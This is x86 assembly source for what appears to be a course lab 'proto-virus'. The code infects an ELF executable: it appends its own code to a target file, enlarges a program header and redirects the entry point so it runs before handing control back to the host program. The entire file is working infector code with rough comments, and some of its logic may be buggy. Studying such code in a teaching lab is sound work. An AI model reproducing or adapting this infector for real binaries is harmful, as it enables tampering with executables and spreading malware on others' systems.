
%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:
    push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	call get_my_loc
    mov edx, next_i                     
    sub  edx, mesg                   
    sub  ecx, edx   
    write 1, ecx, 16; stdout is 1
    mov ecx,0
    call get_my_loc
    mov edx, next_i                     
    sub  edx, FileName                   
    sub  ecx, edx  
    mov ebx,ecx
    open ebx,RDWR,0777
    ;open FileName,RDWR,0777
    mov dword[ebp-4],eax
    cmp dword[ebp-4], -1
    jle errorVirusExit
    mov ecx,ebp
    sub ecx,8;
    read dword[ebp-4],ecx,4; read from eax that is in ebp-4 the magic numbers
    cmp byte[ebp-8], 0x7f; elfmago0
    jne errorVirusExit;
    cmp byte[ebp-8+1],'E'; elfmago1
    jne errorVirusExit;
    cmp byte[ebp-8+2], 'L'; elfmago2
    jne errorVirusExit;
    cmp byte[ebp-8+3],'F'; elfmago3
    jne errorVirusExit;
    lseek dword[ebp-4],0,SEEK_END;
    mov dword[ebp-8],eax; lseek return offset of bytes from beggging of file 
    call get_my_loc
    mov edx, next_i                     
    sub  edx, _start                   
    sub  ecx, edx
    
    mov ebx,ecx;current start
    
    mov ecx,_start;
    mov edx,virus_end;
    sub edx,ecx; edx know is length
    write dword[ebp-4], ebx, edx; writing our code virus to the end of the File
    lseek dword[ebp-4],0,SEEK_SET;getting the file bact to begin point
    cmp eax,0
    jl errorVirusExit;// jump if less than 0 or equal
    
    
    mov eax,0
    mov edx,0
    mov eax,ebp;
    sub eax,60;52+8
    read dword[ebp-4],eax,52; read 52 , the size of headetelf to minus 8 (we have their 4 magic) and size is 52
    mov ecx,0
    mov ecx, dword[ebp-60+24]; taking old enerty
    mov dword[ebp-64],ecx; putting here old entery in minus 4
    
    
    ;mov edx,dword[ebp-8];getting size of file before changed
    ;add edx, 0x08048000; first virt address of load
    ;mov  dword[ebp-60+24],edx; 24 is in hexa 18 that is after 18 byte is ENTEERY POINT, PUTTING THERE now the new adrr entery point-end of elf file(begin of virus)
    ;lseek dword[ebp-4],0,SEEK_SET; to begin of file des
    ;mov ecx,ebp;
    ;sub ecx,60;52+8
    ;write dword[ebp-4],ecx,52 ;writing the newchanged elfhd to our file
    
   
     mov eax,0
    mov ebx,0
    mov ecx,0
    mov edx,0
     lseek   dword[ebp-4], 52, SEEK_SET          ; bring file location to phdr
     
     ;reset
     mov eax,0
    mov ebx,0
    mov ecx,0
    mov edx,0
    
    mov ecx, ebp
    sub ecx, 96; 64+32(place in ebp and size of phdr we want to put in memory)
    read dword[ebp-4],ecx,32;read program header(from first one of course)
    
    ;reset
     mov eax,0
    mov ebx,0
    mov ecx,0
    mov edx,0
    
   ; mov eax, dword[ebp-88]; from 96 after 8 bytes its program virtaddr(load adresss like before!!),so 96-8=88
   ; mov dword[ebp-96-4],eax; put the above virtaddr of load in memory for next use
    ;secondphdr is starting from 128 down
    ;reset
    mov ecx,0
    mov ecx,ebp
    sub ecx,128 ;we are in ebp-96; and we want to put next program header size 32(we didnt reset fd so we are allready in the position of second prog header
    read dword[ebp-4],ecx,32;
    
    ;reset
     mov eax,0
    mov ebx,0
    mov ecx,0
    mov edx,0
    
    mov ebx,dword[ebp-124]; 128-prog2offsteposition( that is 4 bytes after)CHECK IF NEED
    
    
    
    mov ecx,_start;
    mov edx,virus_end;
    sub edx,ecx; ebx know is length
    
    add edx,dword[ebp-8]; virus size plus file original size
    sub edx,dword[ebp-124]; the offste is 4 byte of begin prog2heaader so 128-4=124
    ;modifieng memsize anf filesize
    mov dword[ebp-108],edx; 128-20(memsize position in progheader2) plus addingg virus size anf originalfile size-offsetprog2
    mov dword[ebp-112], edx;128-16(memsize position in progheader2) plus addingg virus size anf originalfile size-offsetprog2
    
    
    
    
    mov ebx,-32
    lseek dword[ebp-4],ebx,1; we read 32 bytes ,we want to get back to begin of proghead2 to put the changed date in it , 1 is SEEK_CURR
    mov ecx,0
    mov ecx,ebp
    sub ecx,128
    write dword[ebp-4],ecx,32; rewrite to file the prog2head changed
    
    ;reset
     mov eax,0
    mov ebx,0
    mov ecx,0
    mov edx,0
    
    mov ebx,dword[ebp-88]; 96-viraddrofprog1header(at position 8 bytes forward, virt adress of load1(loadadress))
    add ebx,dword[ebp-8]; ebp-8 holding as before original file size(adding to virtadd1 the file orginial size
    
    
    add ebx,dword[ebp-68]; adding the align which is  is 28 byte of begin prog2=1heaader so 96-28=68
    mov dword[ebp-36],ebx; from ebp-60 ,24 bytes forward its the entry point position changed it to be as asked in the task
    
    lseek dword[ebp-4],0,SEEK_SET; to begin of file des
    mov ecx,0;
    mov ecx,ebp;
    sub ecx,60;52+8
    write dword[ebp-4],ecx,52 ;writing the newchanged elfhd to our file
    
    
    
    
    
    
    
    
    
    
    
    
    
    mov eax,0
    mov ebx,0
    mov ecx,0
    mov edx,0
    
    
    
    mov edx,PreviousEntryPoint
    mov ebx, virus_end
    sub edx,ebx;edx is length
    mov ecx,0
    mov ecx,-4
    lseek dword[ebp-4],ecx,SEEK_END; last 4 byte are exactly the label PreviousEntryPoint
    
    mov eax,0
    
    mov eax,ebp
    sub eax,64
    write dword[ebp-4],eax,4; write old enetry to end of file after end virus, old entery is adress to we write 4 bytes
    
    
            
         
    
    
    
    
    
; You code for this lab goes here

VirusExit:
      exit 0
     
errorVirusExit:
mov ecx, 0
mov ebx,0
mov eax,0
mov edx,0
call    get_my_loc                      
mov     edx, next_i                    
sub     edx, PreviousEntryPoint         
sub     ecx, edx                        
mov eax,ecx
call get_my_loc
mov     edx, next_i                    
sub     edx, VirusExit         
sub     ecx, edx                 
cmp eax, ecx; check if adress of PreviousEntryPoint stayed like VirusExit or changed(due to putting their different value)
jne activateOldEntryPoint
exit -1
activateOldEntryPoint:
jmp dword[eax];  jumpint to the old entery point if the file
	
;FileName:	db "ELFexec2short", 0
FileName:	db "ELFexec2long", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
mesg:       db "This is a virus", 10, 0
Failstr:        db "perhaps not", 10 , 0

get_my_loc:
call next_i
next_i:
pop ecx
ret
	
PreviousEntryPoint: dd VirusExit;those are the last 4 bytes of the virus!!
virus_end:

